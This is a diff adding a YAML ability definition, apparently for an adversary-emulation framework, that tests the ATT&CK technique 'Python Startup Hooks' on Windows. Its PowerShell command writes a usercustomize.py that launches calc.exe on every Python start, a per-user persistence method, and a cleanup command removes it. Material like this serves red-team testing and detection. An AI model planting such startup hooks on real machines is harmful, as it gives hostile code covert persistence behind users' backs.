@@ -1,0 +1,32 @@
+---
+- id: 4bfe137ab683c5ea4c28f6686ee8a354
+  name: Python Startup Hook - usercustomize.py (Windows)
+  description: "Executes code via usercustomize.py. This is a per-user persistence\
+    \ mechanism \nthat does not require Administrative privileges.\n"
+  tactic: multiple
+  technique:
+    attack_id: T1546.018
+    name: 'Event Triggered Execution: Python Startup Hooks'
+  platforms:
+    windows:
+      psh:
+        command: $UserDir = & "python.exe" -c "import site; print(site.getusersitepackages())";
+          if (!(Test-Path $UserDir)) { New-Item -ItemType Directory -Path $UserDir
+          -Force }; "import os; os.system('calc.exe')" | Out-File -FilePath "$UserDir\usercustomize.py"
+          -Encoding ASCII; Get-ChildItem -Path "$UserDir"; & "python.exe" -c "print('Triggering
+          Hook via usercustomize...')"
+        payloads: []
+        cleanup: '$PyBin = if (Get-Command "python.exe" -ErrorAction SilentlyContinue)
+          { "python.exe" } elseif (Get-Command "python3.exe" -ErrorAction SilentlyContinue)
+          { "python3.exe" } else { "python.exe" }; $UserDir = & $PyBin -S -c "import
+          site; print(site.getusersitepackages())"; if (-not (Get-ChildItem -Path
+          $UserDir -Recurse -ErrorAction SilentlyContinue | Where-Object Name -like
+          ''usercustomize*'')) { Write-Host "[!] Artifact missing: $UserDir\usercustomize.py
+          - [-] Please Run : Invoke-AtomicTest T1546.018"; exit 1 }; Get-ChildItem
+          -Path "$UserDir" -Recurse -Force |; Where-Object { $_.Name -like "usercustomize*"
+          } |; Remove-Item -Force ; Write-Host "[+] Successfully Removed usercustomize.py
+          under $UserDir"; Get-Process -Name "Calc*", "calc*" -ErrorAction SilentlyContinue
+          | Stop-Process -Force; Write-Host "[+] Successfully Terminated Calculator"'
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
